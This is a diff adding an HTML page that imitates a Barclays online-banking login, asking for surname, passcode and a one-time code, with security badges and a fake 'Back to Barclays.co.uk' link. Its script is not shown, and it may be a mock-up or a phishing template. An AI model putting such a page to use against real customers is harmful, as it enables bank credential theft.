@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Barclays — Login</title>
+  <link href="https://fonts.googleapis.com/css2?family=Barlow:wght@300;400;500;600;700&family=Barlow+Condensed:wght@600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <div id="login">
+    <div class="login-box" style="margin-top:8vh">
+      <div class="login-logo">
+        <img src="barclays-investment-bank-logo-115630277832rlaxpy1ry.png" alt="Barclays Logo" height="48">
+        <span class="logo-text" style="font-size:1.5rem;display:block;margin-top:6px">BARCLAYS</span>
+      </div>
+      <h2>Welcome back</h2>
+      <p class="login-sub">Sign in to Online Banking</p>
+      <div class="login-error" id="loginError">Incorrect surname or passcode. Please try again.</div>
+      <div class="form-field">
+        <label>Surname</label>
+        <input type="text" id="loginSurname" placeholder="e.g. Henshall" autocomplete="family-name">
+      </div>
+      <div class="form-field">
+        <label>Passcode</label>
+        <input type="password" id="loginPass" placeholder="5-digit passcode">
+      </div>
+      <div class="form-field otp-field" id="otpField" style="display:none">
+        <label>One-Time Passcode</label>
+        <input type="text" id="loginOTP" placeholder="6-digit code" maxlength="6">
+      </div>
+      <button class="login-btn" onclick="doLogin()">Log in securely</button>
+      <p class="login-hint">Forgotten your details? <span>Get help</span></p>
+      <div class="login-security">🔒 256-bit encrypted · FCA regulated · FSCS protected</div>
+      <p style="text-align:center;margin-top:1.5rem;font-size:0.78rem;color:var(--gray-400)">
+        <span style="color:var(--blue);cursor:pointer" onclick="window.location.href='landing.html'">← Back to Barclays.co.uk</span>
+      </p>
+    </div>
+  </div>
+  <script src="script.js"></script>
+</body>
+</html>
